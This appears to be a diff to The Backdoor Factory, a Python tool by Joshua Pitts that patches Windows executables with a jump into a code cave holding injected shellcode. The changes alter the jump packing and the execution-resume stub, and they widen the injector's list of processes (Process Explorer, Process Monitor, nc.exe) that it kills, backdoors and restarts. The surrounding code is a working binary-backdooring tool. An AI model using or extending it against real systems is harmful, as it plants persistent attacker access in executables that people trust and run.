@@ -5,7 +5,7 @@
     Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
     Special thanks to Travis Morrow.
 
-    Copyright 2013 Joshua Pitts
+    Copyright (C) 2013, Joshua Pitts
 
     License:   GPLv3
 
@@ -661,10 +661,8 @@ def patch_initial_instructions(fileItems, ImpList, count_bytes):
     #This is the JMP command in the beginning of the
     #code entry point that jumps to the codecave
     f.write(struct.pack('=B', int('E9', 16)))
-    #Each module will need to define the JMP address I can have
-    #one for each type of code cave module and this could be a variable
-
-    f.write(struct.pack('<i', fileItems['JMPtoCodeAddress']))
+    
+    f.write(struct.pack('<I', fileItems['JMPtoCodeAddress']))
     #align the stack if the     first OpCode+instruction is less
     #than 5 bytes fill with nops to align everything. Not a for loop.
     FrstOpCode = ImpList[0][1].keys()[0]
@@ -734,6 +732,8 @@ def resume_execution_32(ImpList):
             # POP ECX to find location
             resumeExe += struct.pack('=B', int('59', 16))
             #add ECX,10 push ECX
+            # Will need to build an ASM routine to beat ASLR
+            print "VSP", hex(fileItems['VirtualStartingPoint'])
             resumeExe += "\x83\xC1\x16\x51"
             resumeExe += "\x25"          #
             resumeExe += compliment_one  #
@@ -1408,7 +1408,10 @@ def injector(suffix, change_Access, SHELL, encoder, host,
                        'nc.exe': [('nc.exe', ), None, False],
                        'Start Tor Browser.exe':
                        [('Start Tor Browser.exe', ), None, False],
-                       'procexp.exe': [('procexp.exe', ), None, True],
+                       'procexp.exe': [('procexp.exe',
+                                        'procexp64.exe'), None, True],
+                       'procmon.exe': [('procmon.exe',
+                                        'procmon64.exe'), None, True]
                        }
 
     os_name = os.name
@@ -1536,7 +1539,6 @@ def injector(suffix, change_Access, SHELL, encoder, host,
                 if setprocess.lower() in target.lower():
                     #print setprocess, process
                     for item in items[0]:
-                        #print item
                         if item.lower() in [x.lower() for x in process]:
                             print "Killing process:", item
                             try:
@@ -1590,13 +1592,22 @@ def injector(suffix, change_Access, SHELL, encoder, host,
         if service_target is True:
             #print "items[1]:", list_of_targets[filename][1]
             os.system('net start %s' % list_of_targets[filename][1])
-        elif list_of_targets[filename][2] is True and running_proc is True:
-            # Todo: Need to build in a process counter and only restart that
-            # number of running instances at time of process killing
-            subprocess.Popen([target, ])
-            print "Restarting:", target
         else:
-            print "%s was not found online -  not restarting" % target
+            try:
+                if (list_of_targets[filename][2] is True and
+                   running_proc is True):
+                    subprocess.Popen([target, ])
+                    print "Restarting:", target
+                else:
+                    print "%s was not found online -  not restarting" % target
+
+            except:
+                if (list_of_targets[filename.lower()][2] is True and
+                   running_proc is True):
+                    subprocess.Popen([target, ])
+                    print "Restarting:", target
+                else:
+                    print "%s was not found online -  not restarting" % target
 
 
 if __name__ == "__main__":
